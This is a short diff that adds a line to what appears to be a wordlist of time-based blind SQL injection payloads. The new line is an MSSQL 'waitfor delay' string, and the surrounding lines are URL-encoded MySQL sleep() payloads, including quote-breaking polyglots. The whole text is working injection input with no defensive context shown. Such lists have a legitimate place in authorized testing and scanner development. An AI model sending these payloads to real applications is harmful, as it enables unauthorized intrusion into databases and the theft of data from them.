@@ -1,3 +1,4 @@
+';%20waitfor%20delay%20'0:0:6'%20--%20
 %2b(select*from(select(sleep(20)))a)%2b
 (select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
 if(now()=sysdate()%2Csleep(10)%2C0)
